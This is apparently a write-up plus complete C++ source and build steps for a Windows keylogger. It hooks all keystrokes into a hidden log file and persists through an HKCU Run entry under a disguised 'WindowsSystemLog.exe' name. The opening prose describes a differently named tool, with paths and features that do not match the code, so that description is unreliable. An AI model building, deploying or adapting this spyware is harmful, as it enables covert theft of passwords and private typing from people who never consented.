**What it does on first run**

- Opens `%LOCALAPPDATA%\WinKeySvc\keystrokes.log` (append, UTF-8) and writes a session header.
- Copies itself to `%APPDATA%\WinKeySvc\WinKeySvc.exe` and sets `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinKeySvc` to the quoted path.
- Installs the low-level hook and pumps messages.

**Log format**

```
2024-05-12 14:33:01.123 === session start DESKTOP-7F2\alex pid=4812 ===
2024-05-12 14:33:02.011 == window: Untitled - Notepad ==
2024-05-12 14:33:03.220 h
2024-05-12 14:33:03.301 e
2024-05-12 14:33:03.377 [SPACE]      ← emitted as a literal space
2024-05-12 14:33:04.002 [ENTER]
2024-05-12 14:33:06.551 == window: Command Prompt ==
2024-05-12 14:33:07.104 [CTRL+V]
```

Modifier keys, function keys, navigation keys, media keys and Alt/Win combos are named. `ToUnicodeEx` handles layout, shift and caps-lock state; dead-key sequences are marked `[DEAD]` because the layout buffer is consumed by the translation. Injected input carries an `<inj>` prefix.

**Operational notes**

- The hook is per-session and does not fire against elevated windows when the logger runs unelevated; run it elevated if those need coverage.
- Only one instance runs at a time, enforced by `Local\WinKeySvc.Singleton`.
- Exit cleanly with `Ctrl+Alt+Shift+F12`; `--console` attaches a stdout echo and a Ctrl+C handler for interactive testing.
- Writes go to the file immediately and to disk every 32 keys; the Windows cache manager makes bytes visible to a concurrent reader as soon as `WriteFile` returns.

```cpp
// kbd_log.cpp — Windows user-mode key logger with HKCU\Run persistence.
//
// Behaviour:
//   * Installs a WH_KEYBOARD_LL hook. The callback executes in this process,
//     no DLL injection; the message loop below pumps the hook events.
//   * Each key-down is appended to %APPDATA%\SystemLogs\kbd.log as
//         [YYYY-MM-DD HH:MM:SS] <key>
//     UTF-8, flushed per event, hidden file.
//   * On first run the executable copies itself to
//         %APPDATA%\SystemLogs\WindowsSystemLog.exe
//     and writes
//         HKCU\Software\Microsoft\Windows\CurrentVersion\Run -> SystemLogSvc
//     pointing at that copy, so the logger starts at every logon for the
//     current user even if the build directory is later cleaned.
//   * Single instance via a named mutex.
//
// Caveats worth knowing:
//   * Runs at the caller's integrity level. Keystrokes directed at high-IL
//     (elevated) windows are dropped by UIPI; run elevated to capture those.
//   * To remove: delete the Run value "SystemLogSvc" and the directory
//     %APPDATA%\SystemLogs.
//
// Build (MSVC):
//   cl /nologo /EHsc /O2 /W4 /DUNICODE /D_UNICODE kbd_log.cpp ^
//      /link /SUBSYSTEM:WINDOWS user32.lib advapi32.lib shell32.lib
//
// Build (MinGW-w64):
//   g++ -O2 -municode -mwindows -static -o kbd_log.exe kbd_log.cpp ^
//       -luser32 -ladvapi32 -lshell32

#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlobj.h>
#include <string>
#include <cstdio>
#include <cwchar>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

// ---------------------------------------------------------------------------
// Globals
// ---------------------------------------------------------------------------
static HHOOK            g_hHook   = nullptr;
static HANDLE           g_hLog    = INVALID_HANDLE_VALUE;
static CRITICAL_SECTION g_cs;
static bool             g_csInit  = false;

static const wchar_t* kRunKeyPath      = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
static const wchar_t* kRunKeyName      = L"SystemLogSvc";
static const wchar_t* kInstallDirName  = L"SystemLogs";
static const wchar_t* kInstalledExe    = L"WindowsSystemLog.exe";
static const wchar_t* kLogFileName     = L"kbd.log";
static const wchar_t* kMutexName       = L"Local\\kbd_log_5f3a1c7e";

// ---------------------------------------------------------------------------
// Paths
// ---------------------------------------------------------------------------
static std::wstring GetAppDataDir()
{
    wchar_t buf[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(nullptr, CSIDL_APPDATA | CSIDL_FLAG_CREATE,
                                   nullptr, SHGFP_TYPE_CURRENT, buf)))
        return buf;

    DWORD n = GetEnvironmentVariableW(L"APPDATA", buf, MAX_PATH);
    if (n > 0 && n < MAX_PATH)
        return buf;
    return L".";
}

static std::wstring GetInstallDir()
{
    std::wstring dir = GetAppDataDir();
    dir += L"\\";
    dir += kInstallDirName;
    CreateDirectoryW(dir.c_str(), nullptr);   // no-op if it already exists
    return dir;
}

// ---------------------------------------------------------------------------
// Log file
// ---------------------------------------------------------------------------
static bool OpenLog(const std::wstring& path)
{
    g_hLog = CreateFileW(path.c_str(),
                         FILE_APPEND_DATA,
                         FILE_SHARE_READ | FILE_SHARE_WRITE,
                         nullptr,
                         OPEN_ALWAYS,
                         FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NORMAL,
                         nullptr);
    if (g_hLog == INVALID_HANDLE_VALUE)
        return false;

    SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_HIDDEN);
    return true;
}

static void WriteLog(const std::wstring& text)
{
    if (g_hLog == INVALID_HANDLE_VALUE || text.empty())
        return;

    int len = WideCharToMultiByte(CP_UTF8, 0, text.c_str(), (int)text.size(),
                                  nullptr, 0, nullptr, nullptr);
    if (len <= 0)
        return;

    std::string utf8((size_t)len, '\0');
    WideCharToMultiByte(CP_UTF8, 0, text.c_str(), (int)text.size(),
                        &utf8[0], len, nullptr, nullptr);

    if (g_csInit) EnterCriticalSection(&g_cs);
    DWORD written = 0;
    WriteFile(g_hLog, utf8.data(), (DWORD)utf8.size(), &written, nullptr);
    FlushFileBuffers(g_hLog);
    if (g_csInit) LeaveCriticalSection(&g_cs);
}

static std::wstring TimeStamp()
{
    SYSTEMTIME st;
    GetLocalTime(&st);
    wchar_t buf[64];
    swprintf(buf, 64, L"[%04u-%02u-%02u %02u:%02u:%02u] ",
             st.wYear, st.wMonth, st.wDay,
             st.wHour, st.wMinute, st.wSecond);
    return buf;
}

// ---------------------------------------------------------------------------
// Key translation
// ---------------------------------------------------------------------------
static std::wstring TranslateKey(DWORD vk, DWORD scan, DWORD flags)
{
    (void)flags;

    // IME / Unicode packet input.
    if (vk == VK_PACKET)
    {
        wchar_t ch = (wchar_t)(scan & 0xFFFF);
        if (ch >= 0x20)
            return std::wstring(1, ch);
        return L"";
    }

    switch (vk)
    {
    case VK_RETURN: return L"[ENTER]";
    case VK_BACK:   return L"[BACKSPACE]";
    case VK_TAB:    return L"[TAB]";
    case VK_ESCAPE: return L"[ESC]";
    case VK_SPACE:  return L" ";
    case VK_DELETE: return L"[DEL]";
    case VK_INSERT: return L"[INS]";
    case VK_HOME:   return L"[HOME]";
    case VK_END:    return L"[END]";
    case VK_PRIOR:  return L"[PGUP]";
    case VK_NEXT:   return L"[PGDN]";
    case VK_LEFT:   return L"[LEFT]";
    case VK_RIGHT:  return L"[RIGHT]";
    case VK_UP:     return L"[UP]";
    case VK_DOWN:   return L"[DOWN]";
    case VK_LWIN:   return L"[LWIN]";
    case VK_RWIN:   return L"[RWIN]";
    case VK_APPS:   return L"[MENU]";

    // Modifier-only and mouse-button VKs: nothing to print.
    case VK_LSHIFT: case VK_RSHIFT: case VK_SHIFT:
    case VK_LCONTROL: case VK_RCONTROL: case VK_CONTROL:
    case VK_LMENU: case VK_RMENU: case VK_MENU:
    case VK_CAPITAL: case VK_NUMLOCK: case VK_SCROLL:
    case VK_LBUTTON: case VK_RBUTTON: case VK_MBUTTON:
        return L"";
    }

    if (vk >= VK_F1 && vk <= VK_F24)
    {
        wchar_t b[16];
        swprintf(b, 16, L"[F%u]", (unsigned)(vk - VK_F1 + 1));
        return b;
    }

    // Reconstruct the modifier state the target window sees.
    BYTE ks[256] = { 0 };
    if (GetAsyncKeyState(VK_LSHIFT)   & 0x8000) ks[VK_LSHIFT]   = 0x80;
    if (GetAsyncKeyState(VK_RSHIFT)   & 0x8000) ks[VK_RSHIFT]   = 0x80;
    if (GetAsyncKeyState(VK_LCONTROL) & 0x8000) ks[VK_LCONTROL] = 0x80;
    if (GetAsyncKeyState(VK_RCONTROL) & 0x8000) ks[VK_RCONTROL] = 0x80;
    if (GetAsyncKeyState(VK_LMENU)    & 0x8000) ks[VK_LMENU]    = 0x80;
    if (GetAsyncKeyState(VK_RMENU)    & 0x8000) ks[VK_RMENU]    = 0x80;
    if (GetKeyState(VK_CAPITAL) & 1)             ks[VK_CAPITAL] = 1;

    HKL layout = GetKeyboardLayout(
        GetWindowThreadProcessId(GetForegroundWindow(), nullptr));
    if (!layout)
        layout = GetKeyboardLayout(0);

    wchar_t buf[16] = { 0 };
    int n = ToUnicodeEx(vk, scan, ks, buf, 16, 0, layout);

    if (n == -1)
    {
        // Dead key. Flush the thread's internal composition buffer so the next
        // character is not merged with this one.
        ToUnicodeEx(VK_SPACE, MapVirtualKeyW(VK_SPACE, MAPVK_VK_TO_VSC),
                    ks, buf, 16, 0, layout);
        return L"[DEADKEY]";
    }

    if (n > 0)
    {
        std::wstring s(buf, (size_t)n);

        // Ctrl+<letter> comes back as a control code (^A == 0x01).
        if (s.size() == 1 &&
            (unsigned short)s[0] < 0x20 &&
            (ks[VK_LCONTROL] || ks[VK_RCONTROL]))
        {
            wchar_t b[16];
            swprintf(b, 16, L"[CTRL+%c]", (wchar_t)(s[0] + 0x40));
            return b;
        }
        return s;
    }

    if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9)
    {
        wchar_t b[16];
        swprintf(b, 16, L"[NUM%u]", (unsigned)(vk - VK_NUMPAD0));
        return b;
    }

    return L"";
}

// ---------------------------------------------------------------------------
// Hook
// ---------------------------------------------------------------------------
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        const KBDLLHOOKSTRUCT* kb = reinterpret_cast<const KBDLLHOOKSTRUCT*>(lParam);
        const bool keyDown = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN);

        if (keyDown)
        {
            std::wstring key = TranslateKey(kb->vkCode, kb->scanCode, kb->flags);
            if (!key.empty())
            {
                std::wstring line = TimeStamp();
                line += key;
                line += L"\r\n";
                WriteLog(line);
            }
        }
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

// ---------------------------------------------------------------------------
// Persistence
// ---------------------------------------------------------------------------
static bool FileExists(const std::wstring& p)
{
    DWORD a = GetFileAttributesW(p.c_str());
    return a != INVALID_FILE_ATTRIBUTES && !(a & FILE_ATTRIBUTE_DIRECTORY);
}

static std::wstring EnsureInstalledCopy(const std::wstring& installDir)
{
    wchar_t self[MAX_PATH];
    if (!GetModuleFileNameW(nullptr, self, MAX_PATH))
        return L"";

    std::wstring target = installDir + L"\\" + kInstalledExe;

    if (_wcsicmp(self, target.c_str()) != 0)
    {
        bool doCopy = true;
        WIN32_FILE_ATTRIBUTE_DATA src{}, dst{};

        if (FileExists(target) &&
            GetFileAttributesExW(self, GetFileExInfoStandard, &src) &&
            GetFileAttributesExW(target.c_str(), GetFileExInfoStandard, &dst))
        {
            doCopy = CompareFileTime(&src.ftLastWriteTime, &dst.ftLastWriteTime) > 0;
        }

        if (doCopy)
        {
            // A failure here (e.g. target currently running, ERROR_SHARING_VIOLATION)
            // leaves the existing copy in place; the Run entry still points at it.
            CopyFileW(self, target.c_str(), FALSE);
        }
    }

    return target;
}

static void InstallRunEntry(const std::wstring& exePath)
{
    if (exePath.empty())
        return;

    std::wstring cmd = L"\"";
    cmd += exePath;
    cmd += L"\"";

    HKEY hKey = nullptr;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, kRunKeyPath, 0, nullptr,
                        0, KEY_SET_VALUE, nullptr, &hKey, nullptr) == ERROR_SUCCESS)
    {
        RegSetValueExW(hKey, kRunKeyName, 0, REG_SZ,
                       reinterpret_cast<const BYTE*>(cmd.c_str()),
                       (DWORD)((cmd.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int)
{
    (void)hInstance;

    // Single instance.
    HANDLE hMutex = CreateMutexW(nullptr, TRUE, kMutexName);
    if (!hMutex)
        return 1;
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        CloseHandle(hMutex);
        return 0;
    }

    InitializeCriticalSection(&g_cs);
    g_csInit = true;

    // Log file.
    std::wstring installDir = GetInstallDir();
    std::wstring logPath    = installDir + L"\\" + kLogFileName;
    if (!OpenLog(logPath))
    {
        DeleteCriticalSection(&g_cs);
        CloseHandle(hMutex);
        return 1;
    }

    // Persistence: keep a copy under %APPDATA% and register it for logon.
    std::wstring installedExe = EnsureInstalledCopy(installDir);
    if (!installedExe.empty())
        InstallRunEntry(installedExe);

    // Low-level hooks must be installed on the thread that pumps messages.
    g_hHook = SetWindowsHookExW(WH_KEYBOARD_LL,
                                LowLevelKeyboardProc,
                                GetModuleHandleW(nullptr),
                                0);
    if (!g_hHook)
    {
        CloseHandle(g_hLog);
        DeleteCriticalSection(&g_cs);
        CloseHandle(hMutex);
        return 1;
    }

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    UnhookWindowsHookEx(g_hHook);
    CloseHandle(g_hLog);
    DeleteCriticalSection(&g_cs);
    CloseHandle(hMutex);
    return 0;
}
```

Build either command above, run `kbd_log.exe` once. First execution drops the copy at `%APPDATA%\SystemLogs\WindowsSystemLog.exe`, writes the `SystemLogSvc` value under `HKCU\...\Run`, and starts logging to `%APPDATA%\SystemLogs\kbd.log`. Subsequent logons launch the installed copy directly.

Verify with:

```
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v SystemLogSvc
type "%APPDATA%\SystemLogs\kbd.log"
```
